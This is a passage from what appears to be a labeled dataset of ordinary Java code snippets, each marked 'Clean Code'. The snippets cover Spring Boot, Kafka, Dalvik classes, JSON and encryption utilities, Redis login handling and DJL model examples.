  public static void main(  String[] args){
    SpringApplication.run(EurekaProviderApplication.class,args);
  }
  @Bean @LoadBalanced RestTemplate getRestTemplate(){
    RestTemplate restTemplate=new RestTemplate();
    restTemplate.getInterceptors().add(new LoggingClientHttpRequestInterceptor());
    return restTemplate;
  }
}
@SpringBootApplication public class EurekaProviderApplication {
  public static void main(  String[] args){
    SpringApplication.run(EurekaProviderApplication.class,args);
  }
}
@SpringBootApplication public class EurekaProviderApplication {
  public static void main(  String[] args){
    SpringApplication.run(EurekaProviderApplication.class,args);
  }
  @Bean @LoadBalanced RestTemplate getRestTemplate(){
    RestTemplate restTemplate=new RestTemplate();
    restTemplate.getInterceptors().add(new LoggingClientHttpRequestInterceptor());
    return restTemplate;
  }
}
@SpringBootApplication public class EurekaProviderApplication {
  public static void main(  String[] args){
    SpringApplication.run(EurekaProviderApplication.class,args);
  }
}
",0,Clean Code
"/** 
 * Constants of type  {@code short}. 
 */
public final class CstShort extends CstLiteral32 {
  /** 
 * {@code non-null;} the value {@code 0} as an instance of this class 
 */
  public static final CstShort VALUE_0=make((short)0);
  /** 
 * Constructs an instance. This constructor is private; use  {@link #make}.
 * @param value the {@code short} value
 */
  private CstShort(  short value){
    super(value);
  }
  /** 
 * Makes an instance for the given value. This may (but does not necessarily) return an already-allocated instance.
 * @param value the {@code short} value
 * @return {@code non-null;} the appropriate instance
 */
  public static CstShort make(  short value){
    return new CstShort(value);
  }
  /** 
 * Makes an instance for the given  {@code int} value. This may (but does not necessarily) returnan already-allocated instance.
 * @param value the value, which must be in range for a {@code short}
 * @return {@code non-null;} the appropriate instance
 */
  public static CstShort make(  int value){
    short cast=(short)value;
    if (cast != value) {
      throw new IllegalArgumentException(""bogus short value: "" + value);
    }
    return make(cast);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String toString(){
    int value=getIntBits();
    return ""short{0x"" + Hex.u2(value) + "" / ""+ value+ '}';
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Type getType(){
    return Type.SHORT;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String typeName(){
    return ""short"";
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String toHuman(){
    return Integer.toString(getIntBits());
  }
  /** 
 * Gets the  {@code short} value.
 * @return the value
 */
  public short getValue(){
    return (short)getIntBits();
  }
}
",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023/3/26 11:14Json的父类
 */
public class BasicJson {
  private static final BasicJsonReader basicJsonReader=new BasicJsonReader();
  private static final BasicJsonwriter basicJsonwriter=new BasicJsonwriter();
  /** 
 * object to json
 * @param object
 * @return
 */
  public static String toJson(  Object object){
    return basicJsonwriter.toJson(object);
  }
  /** 
 * parse json to map
 * @param json
 * @return only for filed type ""null、ArrayList、LinkedHashMap、String、Long、Double、...""
 */
  public static Map<String,Object> parseMap(  String json){
    return basicJsonReader.parseMap(json);
  }
  /** 
 * json to List
 * @param json
 * @return
 */
  public static List<Object> parseList(  String json){
    return basicJsonReader.parseList(json);
  }
  public static void main(  String[] args){
    Map<String,Object> result=new HashMap<>();
    result.put(""code"",200);
    result.put(""msg"",""success"");
    result.put(""arr"",Arrays.asList(""111"",""222""));
    result.put(""float"",1.11f);
    result.put(""temp"",null);
    String json=toJson(result);
    System.out.println(json);
    Map<String,Object> mapObj=parseMap(json);
    System.out.println(mapObj);
    List<Object> listInt=parseList(""[111,222,33]"");
    System.out.println(listInt);
  }
}",0,Clean Code
"/** 
 * API接口 加解密工具类 详情请阅读博客：https://www.cnblogs.com/huanzi-qch/p/10913636.html
 */
@Slf4j public class ApiSecurityUtil {
  /** 
 * API解密
 */
  public static String decrypt(){
    try {
      ServletRequestAttributes attributes=(ServletRequestAttributes)RequestContextHolder.getRequestAttributes();
      HttpServletRequest request=attributes.getRequest();
      String data=request.getParameter(""data"");
      String aesKey=request.getParameter(""aesKey"");
      byte[] plaintext=RsaUtil.decryptByPrivateKey(Base64.decodeBase64(aesKey),RsaUtil.getPrivateKey());
      aesKey=new String(plaintext);
      return AesUtil.decrypt(data,aesKey);
    }
 catch (    Throwable e) {
      throw new ServiceException(ErrorEnum.DECRYPT_FAILURE);
    }
  }
  /** 
 * API加密
 */
  public static Result encrypt(  Object object){
    try {
      ServletRequestAttributes attributes=(ServletRequestAttributes)RequestContextHolder.getRequestAttributes();
      HttpServletRequest request=attributes.getRequest();
      String publicKey=request.getParameter(""publicKey"");
      String key=AesUtil.getKey();
      String dataString;
      if (object instanceof String) {
        dataString=String.valueOf(object);
      }
 else {
        dataString=JsonUtil.stringify(object);
      }
      String data=AesUtil.encrypt(dataString,key);
      String aesKey=Base64.encodeBase64String(RsaUtil.encryptByPublicKey(key.getBytes(),publicKey));
      return Result.of(JsonUtil.parse(""{\""data\"":\"""" + data + ""\"",\""aesKey\"":\""""+ aesKey+ ""\""}"",Object.class));
    }
 catch (    Throwable e) {
      throw new ServiceException(ErrorEnum.ENCRYPT_FAILURE);
    }
  }
}
",0,Clean Code
"/** 
 * Kafka消费者——异步提交特定偏移量
 */
public class ConsumerASynWithOffsets {
  public static void main(  String[] args){
    String topic=""Hello-Kafka"";
    String group=""group1"";
    Properties props=new Properties();
    props.put(""bootstrap.servers"",""hadoop001:9092"");
    props.put(""group.id"",group);
    props.put(""enable.auto.commit"",false);
    props.put(""key.deserializer"",""org.apache.kafka.common.serialization.StringDeserializer"");
    props.put(""value.deserializer"",""org.apache.kafka.common.serialization.StringDeserializer"");
    KafkaConsumer<String,String> consumer=new KafkaConsumer<>(props);
    consumer.subscribe(Collections.singletonList(topic));
    Map<TopicPartition,OffsetAndMetadata> offsets=new HashMap<>();
    try {
      while (true) {
        ConsumerRecords<String,String> records=consumer.poll(Duration.of(100,ChronoUnit.MILLIS));
        for (        ConsumerRecord<String,String> record : records) {
          System.out.println(record);
          TopicPartition topicPartition=new TopicPartition(record.topic(),record.partition());
          OffsetAndMetadata offsetAndMetadata=new OffsetAndMetadata(record.offset() + 1,""no metaData"");
          offsets.put(topicPartition,offsetAndMetadata);
        }
        consumer.commitAsync(offsets,null);
      }
    }
  finally {
      consumer.close();
    }
  }
}
",0,Clean Code
"/** 
 * Instruction visitor that adds some instrumentation code to the Gson.toJson() and Gson.fromJson() methods that prints out the type adapter cache. This can be useful for debugging purposes.
 * @author Lars Vandenbergh
 */
public class GsonInstrumentationAdder implements InstructionVisitor {
  private static final Logger logger=LogManager.getLogger(GsonInstrumentationAdder.class);
  private final ClassPool programClassPool;
  private final ClassPool libraryClassPool;
  private final CodeAttributeEditor codeAttributeEditor;
  /** 
 * Creates a new GsonInstrumentationAdder.
 * @param programClassPool     the program class pool used for looking upprogram class references.
 * @param libraryClassPool     the library class pool used for looking uplibrary class references.
 * @param codeAttributeEditor  the code attribute editor used for editingthe code attribute of the Gson methods.
 */
  public GsonInstrumentationAdder(  ClassPool programClassPool,  ClassPool libraryClassPool,  CodeAttributeEditor codeAttributeEditor){
    this.programClassPool=programClassPool;
    this.libraryClassPool=libraryClassPool;
    this.codeAttributeEditor=codeAttributeEditor;
  }
  @Override public void visitAnyInstruction(  Clazz clazz,  Method method,  CodeAttribute codeAttribute,  int offset,  Instruction instruction){
    if (instruction.actualOpcode() == OP_RETURN || instruction.actualOpcode() == OP_ARETURN) {
      String fullyQualifiedMethodName=clazz.getName() + ""#"" + method.getName(clazz)+ method.getDescriptor(clazz);
      logger.debug(""GsonInstrumentationAdder: instrumenting {}"",fullyQualifiedMethodName);
      InstructionSequenceBuilder ____=new InstructionSequenceBuilder((ProgramClass)clazz,programClassPool,libraryClassPool);
      ____.ldc(""Type token cache after invoking "" + fullyQualifiedMethodName + "":"").aload_0().getfield(clazz.getName(),GsonClassConstants.FIELD_NAME_TYPE_TOKEN_CACHE,GsonClassConstants.FIELD_TYPE_TYPE_TOKEN_CACHE).invokestatic(OptimizedClassConstants.NAME_GSON_UTIL,OptimizedClassConstants.METHOD_NAME_DUMP_TYPE_TOKEN_CACHE,OptimizedClassConstants.METHOD_TYPE_DUMP_TYPE_TOKEN_CACHE);
      codeAttributeEditor.insertBeforeInstruction(offset,____.instructions());
    }
  }
}",0,Clean Code
"/** 
 * @author geekidea
 * @date 2022/7/12
 */
@Slf4j @Service public class AppLoginRedisServiceImpl implements AppLoginRedisService {
  private static final TimeUnit TOKEN_TIME_UNIT=TimeUnit.DAYS;
  @Autowired private LoginAppProperties loginAppProperties;
  @Autowired private RedisTemplate redisTemplate;
  private Integer tokenExpireDays;
  @PostConstruct public void init(){
    log.info(""loginAppProperties = "" + loginAppProperties);
    tokenExpireDays=loginAppProperties.getTokenExpireDays();
  }
  @Override public String getLoginRedisKey(  String token){
    String loginRedisKey=String.format(RedisKey.LOGIN_TOKEN,token);
    return loginRedisKey;
  }
  @Override public void setLoginVo(  String token,  AppLoginVo appLoginVo){
    if (appLoginVo == null) {
      throw new LoginException(""登录用户信息不能为空"");
    }
    if (loginAppProperties.isSingleLogin()) {
      deleteLoginInfoByToken(token);
    }
    String loginTokenRedisKey=getLoginRedisKey(token);
    redisTemplate.opsForValue().set(loginTokenRedisKey,appLoginVo,tokenExpireDays,TOKEN_TIME_UNIT);
  }
  @Override public AppLoginVo getLoginVo(  String token){
    if (StringUtils.isBlank(token)) {
      throw new LoginTokenException(""token不能为空"");
    }
    String loginRedisKey=getLoginRedisKey(token);
    AppLoginVo appLoginVo=(AppLoginVo)redisTemplate.opsForValue().get(loginRedisKey);
    return appLoginVo;
  }
  @Override public void deleteLoginVo(  String token){
    if (StringUtils.isBlank(token)) {
      throw new LoginTokenException(""token不能为空"");
    }
    String loginTokenRedisKey=getLoginRedisKey(token);
    redisTemplate.delete(loginTokenRedisKey);
  }
  @Override public void refreshToken(){
    String token=TokenUtil.getToken();
    if (StringUtils.isBlank(token)) {
      return;
    }
    String loginTokenRedisKey=getLoginRedisKey(token);
    redisTemplate.expire(loginTokenRedisKey,tokenExpireDays,TOKEN_TIME_UNIT);
  }
  @Override public void deleteLoginInfoByToken(  String token){
    log.info(""清除用户的所有redis登录信息："" + token);
    if (StringUtils.isBlank(token)) {
      throw new LoginTokenException(""token不能为空"");
    }
    int lastIndexOf=token.lastIndexOf(""."");
    String userTokenPrefix=token.substring(0,lastIndexOf + 1);
    String userTokenRedisPrefix=userTokenPrefix + ""*"";
    String formatRedisTokenPrefix=String.format(RedisKey.LOGIN_TOKEN,userTokenRedisPrefix);
    Set keys=redisTemplate.keys(formatRedisTokenPrefix);
    if (CollectionUtils.isNotEmpty(keys)) {
      redisTemplate.delete(keys);
    }
  }
}",0,Clean Code
"/** 
 * @author : leix.xie
 * @date : 2018/12/26 19:34
 */
public class MonitorClassVisitor extends ClassVisitor {
  private static final Logger logger=BistouryLoggger.getLogger();
  private String className;
  private String methodName;
  private String methodDesc;
  MonitorClassVisitor(  final ClassVisitor cv,  final String methodName,  final String methodDesc){
    super(Opcodes.ASM7,cv);
    this.methodName=methodName;
    this.methodDesc=methodDesc;
  }
  @Override public void visit(  final int version,  final int access,  final String name,  final String signature,  final String superName,  final String[] interfaces){
    super.visit(version,access,name,signature,superName,interfaces);
    this.className=name;
  }
  @Override public MethodVisitor visitMethod(  int access,  String name,  String desc,  String signature,  String[] exceptions){
    final MethodVisitor methodVisitor=super.visitMethod(access,name,desc,signature,exceptions);
    if (name.equals(methodName) && desc.equals(methodDesc)) {
      logger.debug(""visit method, name: {}, desc: {}"",name,desc);
      MonitorMethodVisitor monitorMV=new MonitorMethodVisitor(methodVisitor,access,name,desc,className);
      AnalyzerAdapter analyzerAdapter=new AnalyzerAdapter(className,access,name,desc,monitorMV);
      monitorMV.setAnalyzerAdapter(analyzerAdapter);
      LocalVariablesSorter localVariablesSorter=new LocalVariablesSorter(access,desc,analyzerAdapter);
      monitorMV.setLocalVariablesSorter(localVariablesSorter);
      return localVariablesSorter;
    }
 else {
      return methodVisitor;
    }
  }
}
",0,Clean Code
"/** 
 * An example of inference using an CLIP model. <p>See this <a href=""https://github.com/deepjavalibrary/djl/blob/master/examples/docs/clip_image_text.md"">doc</a> for information about this example.
 */
public class ClipModel implements AutoCloseable {
  private ZooModel<NDList,NDList> clip;
  private Predictor<Image,float[]> imageFeatureExtractor;
  private Predictor<String,float[]> textFeatureExtractor;
  private Predictor<Pair<Image,String>,float[]> imgTextComparator;
  public ClipModel() throws ModelException, IOException {
    Criteria<NDList,NDList> criteria=Criteria.builder().setTypes(NDList.class,NDList.class).optModelUrls(""https://resources.djl.ai/demo/pytorch/clip.zip"").optTranslator(new NoopTranslator()).optEngine(""PyTorch"").optDevice(Device.cpu()).build();
    clip=criteria.loadModel();
    imageFeatureExtractor=clip.newPredictor(new ImageTranslator());
    textFeatureExtractor=clip.newPredictor(new TextTranslator());
    imgTextComparator=clip.newPredictor(new ImageTextTranslator());
  }
  public float[] extractTextFeatures(  String inputs) throws TranslateException {
    return textFeatureExtractor.predict(inputs);
  }
  public float[] extractImageFeatures(  Image inputs) throws TranslateException {
    return imageFeatureExtractor.predict(inputs);
  }
  public float[] compareTextAndImage(  Image image,  String text) throws TranslateException {
    return imgTextComparator.predict(new Pair<>(image,text));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void close(){
    imageFeatureExtractor.close();
    textFeatureExtractor.close();
    imgTextComparator.close();
    clip.close();
  }
}
",0,Clean Code
"public static class Builder {
  private String author;
  private String name;
  private String label;
  private String version;
  private String decs;
  public static Builder builder(){
    return new Builder();
  }
  public Builder setAuthor(  String value){
    this.author=value;
    return this;
  }
  public Builder setName(  String value){
    this.name=value;
    return this;
  }
  public Builder setLabel(  String value){
    this.label=value;
    return this;
  }
  public Builder setVersion(  String value){
    this.version=value;
    return this;
  }
  public Builder setDecs(  String value){
    this.decs=value;
    return this;
  }
  public QNScriptInfo build(){
    return new QNScriptInfo(name,label,author,version,decs);
  }
}
",0,Clean Code
"/** 
 * A set of some protocol objects. May contain a single element, multiple elements, or a single tag (which itself contains multiple elements).
 * @param < T > The type of protocol object represented by this set.
 */
interface ObjectSet<T extends ProtocolObject> {
  permits ObjectSetImpl;
{
  }
  static <T extends ProtocolObject>@NotNull ObjectSet<T> empty(){
    return (ObjectSet<T>)ObjectSetImpl.Empty.INSTANCE;
  }
  static <T extends ProtocolObject>@NotNull ObjectSet<T> of(  @NotNull Collection<NamespaceID> entries){
    return new ObjectSetImpl.Entries<>(java.util.List.copyOf(entries));
  }
  static <T extends ProtocolObject>@NotNull ObjectSet<T> of(  @NotNull Tag tag){
    return new ObjectSetImpl.Tag<>(tag);
  }
  static <T extends ProtocolObject>NetworkBuffer.@NotNull Type<ObjectSet<T>> networkType(  @NotNull Tag.BasicType tagType){
    return new ObjectSetImpl.NetworkType<>(tagType);
  }
  static <T extends ProtocolObject>@NotNull BinaryTagSerializer<ObjectSet<T>> nbtType(  @NotNull Tag.BasicType tagType){
    return new ObjectSetImpl.NbtType<>(tagType);
  }
  /** 
 * <p>Check if this set contains the given object, tested against its namespace id.</p> <p>Present for compatibility with non-dynamic registries. Will be removed in the future.</p>
 * @param object The object to check for.
 * @return True if this set contains the object, false otherwise.
 */
  default boolean contains(  @NotNull StaticProtocolObject object){
    return contains(object.namespace());
  }
  default boolean contains(  @NotNull DynamicRegistry.Key<T> key){
    return contains(key.namespace());
  }
  boolean contains(  @NotNull NamespaceID namespace);
}
",0,Clean Code
"public final class StyleTransfer {
  private static final Logger logger=LoggerFactory.getLogger(StyleTransfer.class);
  private StyleTransfer(){
  }
  public enum Artist {  CEZANNE,   MONET,   UKIYOE,   VANGOGH}
  public static void main(  String[] args) throws IOException, ModelException, TranslateException {
    Artist artist=Artist.MONET;
    if (args.length == 1) {
      for (      Artist a : Artist.values()) {
        if (a.name().equalsIgnoreCase(args[0])) {
          artist=a;
          break;
        }
      }
    }
    String imagePath=""src/test/resources/mountains.png"";
    Image input=ImageFactory.getInstance().fromFile(Paths.get(imagePath));
    Image output=transfer(input,artist);
    logger.info(""Using PyTorch Engine. {} painting generated. Image saved in build/output/cyclegan"",artist);
    save(output,artist.toString(),""build/output/cyclegan/"");
  }
  public static Image transfer(  Image image,  Artist artist) throws IOException, ModelNotFoundException, MalformedModelException, TranslateException {
    String modelName=""style_"" + artist.toString().toLowerCase(Locale.ROOT);
    String modelUrl=""djl://ai.djl.pytorch/cyclegan/0.0.1/"" + modelName;
    Criteria<Image,Image> criteria=Criteria.builder().optApplication(Application.CV.IMAGE_GENERATION).setTypes(Image.class,Image.class).optModelUrls(modelUrl).optProgress(new ProgressBar()).optTranslatorFactory(new StyleTransferTranslatorFactory()).optEngine(""PyTorch"").build();
    try (ZooModel<Image,Image> model=criteria.loadModel();Predictor<Image,Image> styler=model.newPredictor()){
      return styler.predict(image);
    }
   }
  public static void save(  Image image,  String name,  String path) throws IOException {
    Path outputPath=Paths.get(path);
    Files.createDirectories(outputPath);
    Path imagePath=outputPath.resolve(name + "".png"");
    image.save(Files.newOutputStream(imagePath),""png"");
  }
}
",0,Clean Code
"private static class PFTableModel extends AbstractTableModel {
  private String[] columns={""Type"",""Host"",""Source Port"",""Target Port"",""Bind Host""};
  private List<PortForwardingRule> list=new ArrayList<>();
  @Override public int getRowCount(){
    return list.size();
  }
  @Override public int getColumnCount(){
    return columns.length;
  }
  @Override public String getColumnName(  int column){
    return columns[column];
  }
  @Override public Object getValueAt(  int rowIndex,  int columnIndex){
    PortForwardingRule pf=list.get(rowIndex);
switch (columnIndex) {
case 0:
      return pf.getType();
case 1:
    return pf.getHost();
case 2:
  return pf.getSourcePort();
case 3:
return pf.getTargetPort();
case 4:
return pf.getBindHost();
}
return """";
}
private void setRules(List<PortForwardingRule> rules){
list.clear();
if (rules != null) {
for (PortForwardingRule r : rules) {
list.add(r);
}
}
fireTableDataChanged();
}
private List<PortForwardingRule> getRules(){
return list;
}
private void addRule(PortForwardingRule r){
this.list.add(r);
fireTableDataChanged();
}
private void refreshTable(){
fireTableDataChanged();
}
private void remove(int index){
list.remove(index);
fireTableDataChanged();
}
private PortForwardingRule get(int index){
return list.get(index);
}
}
",0,Clean Code
"@Configuration @EnableTransactionManagement(order=2) public class LinkisMybatisConfig {
  private static final Logger logger=LoggerFactory.getLogger(LinkisMybatisConfig.class);
  private DataSource hiveDataSource(){
    String url=DWSConfig.HIVE_META_URL.getValue();
    String username=DWSConfig.HIVE_META_USER.getValue();
    String password=DWSConfig.HIVE_META_PASSWORD.getValue();
    if (StringUtils.isBlank(url) || StringUtils.isBlank(username) || StringUtils.isBlank(password)) {
      org.apache.hadoop.conf.Configuration hiveConf=HiveUtils.getDefaultConf(HadoopConf.HADOOP_ROOT_USER().getValue());
      logger.info(""from hive conf to pares meta store JDBC url"");
      url=hiveConf.get(""javax.jdo.option.ConnectionURL"");
      username=hiveConf.get(""javax.jdo.option.ConnectionUserName"");
      password=hiveConf.get(""javax.jdo.option.ConnectionPassword"");
      if (DWSConfig.HIVE_PASS_ENCODE_ENABLED.getValue()) {
        logger.info(""hive meta password is encode "");
        password=HiveUtils.decode(password);
      }
    }
    return DataSourceUtils.buildDataSource(url,username,password);
  }
  private DataSource mysqlDataSource(){
    return DataSourceUtils.buildDataSource(null,null,null);
  }
  @Bean(name=""dataSource"") @Conditional(DataSourceCondition.class) public DynamicDataSource mutiDataSource(){
    DataSource hiveDataSource=hiveDataSource();
    DataSource mysqlDataSource=mysqlDataSource();
    DynamicDataSource dynamicDataSource=new DynamicDataSource();
    HashMap<Object,Object> hashMap=new HashMap<>();
    hashMap.put(DSEnum.FIRST_DATA_SOURCE,hiveDataSource);
    hashMap.put(DSEnum.SECONDE_DATA_SOURCE,mysqlDataSource);
    dynamicDataSource.setTargetDataSources(hashMap);
    dynamicDataSource.setDefaultTargetDataSource(mysqlDataSource);
    return dynamicDataSource;
  }
}",0,Clean Code
"/** 
 * consustent hash 单个JOB对应的每个执行器，使用频率最低的优先被选举 a(*)、LFU(Least Frequently Used)：最不经常使用，频率/次数 b、LRU(Least Recently Used)：最近最久未使用，时间
 * @author xuxueli 2018-12-04
 */
public class XxlRpcLoadBalanceConsistentHashStrategy extends XxlRpcLoadBalance {
  private int VIRTUAL_NODE_NUM=5;
  /** 
 * get hash code on 2^32 ring (md5散列的方式计算hash值)
 * @param key
 * @return
 */
  private long hash(  String key){
    MessageDigest md5;
    try {
      md5=MessageDigest.getInstance(""MD5"");
    }
 catch (    NoSuchAlgorithmException e) {
      throw new RuntimeException(""MD5 not supported"",e);
    }
    md5.reset();
    byte[] keyBytes=null;
    try {
      keyBytes=key.getBytes(""UTF-8"");
    }
 catch (    UnsupportedEncodingException e) {
      throw new RuntimeException(""Unknown string :"" + key,e);
    }
    md5.update(keyBytes);
    byte[] digest=md5.digest();
    long hashCode=((long)(digest[3] & 0xFF) << 24) | ((long)(digest[2] & 0xFF) << 16) | ((long)(digest[1] & 0xFF) << 8)| (digest[0] & 0xFF);
    long truncateHashCode=hashCode & 0xffffffffL;
    return truncateHashCode;
  }
  public String doRoute(  String serviceKey,  TreeSet<String> addressSet){
    TreeMap<Long,String> addressRing=new TreeMap<Long,String>();
    for (    String address : addressSet) {
      for (int i=0; i < VIRTUAL_NODE_NUM; i++) {
        long addressHash=hash(""SHARD-"" + address + ""-NODE-""+ i);
        addressRing.put(addressHash,address);
      }
    }
    long jobHash=hash(serviceKey);
    SortedMap<Long,String> lastRing=addressRing.tailMap(jobHash);
    if (!lastRing.isEmpty()) {
      return lastRing.get(lastRing.firstKey());
    }
    return addressRing.firstEntry().getValue();
  }
  @Override public String route(  String serviceKey,  TreeSet<String> addressSet){
    String finalAddress=doRoute(serviceKey,addressSet);
    return finalAddress;
  }
}
",0,Clean Code
"public class ChatRoomViewModel extends ViewModel {
  public MutableLiveData<OperateResult<Boolean>> joinChatRoom(  String chatRoomId){
    MutableLiveData<OperateResult<Boolean>> result=new MutableLiveData<>();
    ChatManager.Instance().joinChatRoom(chatRoomId,new GeneralCallback(){
      @Override public void onSuccess(){
        result.setValue(new OperateResult<>(true,0));
      }
      @Override public void onFail(      int errorCode){
        result.setValue(new OperateResult<>(false,errorCode));
      }
    }
);
    return result;
  }
  public MutableLiveData<OperateResult<Boolean>> quitChatRoom(  String chatRoomId){
    MutableLiveData<OperateResult<Boolean>> result=new MutableLiveData<>();
    ChatManager.Instance().quitChatRoom(chatRoomId,new GeneralCallback(){
      @Override public void onSuccess(){
        result.setValue(new OperateResult<>(true,0));
      }
      @Override public void onFail(      int errorCode){
        result.setValue(new OperateResult<>(false,0));
      }
    }
);
    return result;
  }
  public MutableLiveData<OperateResult<ChatRoomInfo>> getChatRoomInfo(  String chatRoomId,  long updateDt){
    MutableLiveData<OperateResult<ChatRoomInfo>> result=new MutableLiveData<>();
    ChatManager.Instance().getChatRoomInfo(chatRoomId,updateDt,new GetChatRoomInfoCallback(){
      @Override public void onSuccess(      ChatRoomInfo chatRoomInfo){
        result.setValue(new OperateResult<>(chatRoomInfo,0));
      }
      @Override public void onFail(      int errorCode){
        result.setValue(new OperateResult<>(null,errorCode));
      }
    }
);
    return result;
  }
  public MutableLiveData<OperateResult<ChatRoomMembersInfo>> getChatRoomMembersInfo(  String chatRoomId,  int maxCount){
    MutableLiveData<OperateResult<ChatRoomMembersInfo>> result=new MutableLiveData<>();
    ChatManager.Instance().getChatRoomMembersInfo(chatRoomId,maxCount,new GetChatRoomMembersInfoCallback(){
      @Override public void onSuccess(      ChatRoomMembersInfo chatRoomMembersInfo){
        result.setValue(new OperateResult<>(chatRoomMembersInfo,0));
      }
      @Override public void onFail(      int errorCode){
        result.setValue(new OperateResult<>(null,errorCode));
      }
    }
);
    return result;
  }
}
",0,Clean Code
"/** 
 * 通知公告 Service 接口
 */
public interface NoticeService {
  /** 
 * 创建通知公告
 * @param createReqVO 通知公告
 * @return 编号
 */
  Long createNotice(  NoticeSaveReqVO createReqVO);
  /** 
 * 更新通知公告
 * @param reqVO 通知公告
 */
  void updateNotice(  NoticeSaveReqVO reqVO);
  /** 
 * 删除通知公告
 * @param id 编号
 */
  void deleteNotice(  Long id);
  /** 
 * 获得通知公告分页列表
 * @param reqVO 分页条件
 * @return 部门分页列表
 */
  PageResult<NoticeDO> getNoticePage(  NoticePageReqVO reqVO);
  /** 
 * 获得通知公告
 * @param id 编号
 * @return 通知公告
 */
  NoticeDO getNotice(  Long id);
}
",0,Clean Code
"class DeleteBindingActionTest {
  @Test void shouldDefineEndpointWithParameters(){
    DbClient dbClient=mock();
    UserSession userSession=mock();
    ComponentFinder componentFinder=mock();
    DeleteBindingAction testCase=new DeleteBindingAction(dbClient,userSession,componentFinder);
    WebService.NewParam keyParam=mock();
    when(keyParam.setMaximumLength(200)).thenReturn(keyParam);
    WebService.NewParam newKeyParam=mock();
    when(newKeyParam.setMaximumLength(200)).thenReturn(newKeyParam);
    WebService.NewController newController=mock();
    WebService.NewAction newAction=mock();
    when(newController.createAction(""delete_binding"")).thenReturn(newAction);
    when(newAction.setPost(true)).thenReturn(newAction);
    when(newAction.setHandler(testCase)).thenReturn(newAction);
    when(newAction.createParam(""project"")).thenReturn(keyParam);
    testCase.define(newController);
    verify(newAction).setHandler(testCase);
    verify(keyParam).setRequired(true);
  }
  @Test void shouldHandleEndpointWithValidRequest(){
    DbClient dbClient=mock();
    DbSession dbSession=mock();
    when(dbClient.openSession(false)).thenReturn(dbSession);
    AlmSettingDao almSettingDao=mock();
    when(dbClient.almSettingDao()).thenReturn(almSettingDao);
    ProjectAlmSettingDao projectAlmSettingDao=mock();
    when(dbClient.projectAlmSettingDao()).thenReturn(projectAlmSettingDao);
    UserSession userSession=mock();
    ProjectDto componentDto=mock();
    ComponentFinder componentFinder=mock();
    when(componentFinder.getProjectByKey(dbSession,""projectKey"")).thenReturn(componentDto);
    DeleteBindingAction testCase=new DeleteBindingAction(dbClient,userSession,componentFinder);
    Request request=mock(Request.class,Mockito.RETURNS_DEEP_STUBS);
    when(request.mandatoryParam(""project"")).thenReturn(""projectKey"");
    Response response=mock(Response.class,Mockito.RETURNS_DEEP_STUBS);
    testCase.handle(request,response);
    verify(dbSession).commit();
    verify(projectAlmSettingDao).deleteByProject(dbSession,componentDto);
    verify(response).noContent();
    verify(userSession).hasEntityPermission(""admin"",componentDto);
  }
}
",0,Clean Code
"public static class MicaGenerator extends AbstractClassGenerator {
  private static final Source SOURCE=new Source(BEAN_NAME_PREFIX);
  private Object bean;
  private Class beanClass;
  private int require;
  public MicaGenerator(){
    super(SOURCE);
  }
  /** 
 * Set the bean that the generated map should reflect. The bean may be swapped out for another bean of the same type using  {@link #setBean}. Calling this method overrides any value previously set using  {@link #setBeanClass}. You must call either this method or  {@link #setBeanClass} before {@link #create}.
 * @param bean the initial bean
 */
  public void setBean(  Object bean){
    this.bean=bean;
    if (bean != null) {
      beanClass=bean.getClass();
    }
  }
  /** 
 * Set the class of the bean that the generated map should support. You must call either this method or  {@link #setBeanClass} before {@link #create}.
 * @param beanClass the class of the bean
 */
  public void setBeanClass(  Class beanClass){
    this.beanClass=beanClass;
  }
  /** 
 * Limit the properties reflected by the generated map.
 * @param require any combination of {@link #REQUIRE_GETTER} and{@link #REQUIRE_SETTER}; default is zero (any property allowed)
 */
  public void setRequire(  int require){
    this.require=require;
  }
  @Override protected ClassLoader getDefaultClassLoader(){
    return beanClass.getClassLoader();
  }
  @Override protected ProtectionDomain getProtectionDomain(){
    return ReflectUtils.getProtectionDomain(beanClass);
  }
  /** 
 * Create a new instance of the <code>BeanMap</code>. An existing generated class will be reused if possible.
 * @return {MicaBeanMap}
 */
  public MicaBeanMap create(){
    if (beanClass == null) {
      throw new IllegalArgumentException(""Class of bean unknown"");
    }
    MicaBeanMapKey key=new MicaBeanMapKey(beanClass,require);
    return (MicaBeanMap)super.create(key);
  }
  @Override public void setNamePrefix(  String namePrefix){
    super.setNamePrefix(namePrefix);
  }
  @Override public void generateClass(  ClassVisitor v) throws Exception {
    new MicaBeanMapEmitter(v,getClassName(),beanClass,require);
  }
  @Override protected Object firstInstance(  Class type){
    return ((BeanMap)ReflectUtils.newInstance(type)).newInstance(bean);
  }
  @Override protected Object nextInstance(  Object instance){
    return ((BeanMap)instance).newInstance(bean);
  }
}
",0,Clean Code
"/** 
 * Representation of string data for a particular string, in a Dalvik file. 
 */
public final class StringDataItem extends OffsettedItem {
  /** 
 * {@code non-null;} the string value 
 */
  private final CstString value;
  /** 
 * Constructs an instance.
 * @param value {@code non-null;} the string value
 */
  public StringDataItem(  CstString value){
    super(1,writeSize(value));
    this.value=value;
  }
  /** 
 * Gets the write size for a given value.
 * @param value {@code non-null;} the string value
 * @return {@code >= 2}; the write size, in bytes
 */
  private static int writeSize(  CstString value){
    int utf16Size=value.getUtf16Size();
    return Leb128.unsignedLeb128Size(utf16Size) + value.getUtf8Size() + 1;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public ItemType itemType(){
    return ItemType.TYPE_STRING_DATA_ITEM;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void addContents(  DexFile file){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void writeTo0(  DexFile file,  AnnotatedOutput out){
    ByteArray bytes=value.getBytes();
    int utf16Size=value.getUtf16Size();
    if (out.annotates()) {
      out.annotate(Leb128.unsignedLeb128Size(utf16Size),""utf16_size: "" + Hex.u4(utf16Size));
      out.annotate(bytes.size() + 1,value.toQuoted());
    }
    out.writeUleb128(utf16Size);
    out.write(bytes);
    out.writeByte(0);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String toHuman(){
    return value.toQuoted();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override protected int compareTo0(  OffsettedItem other){
    StringDataItem otherData=(StringDataItem)other;
    return value.compareTo(otherData.value);
  }
}
",0,Clean Code
"public class SocketWriteTest {
  record IntPacket(  int value){
  }
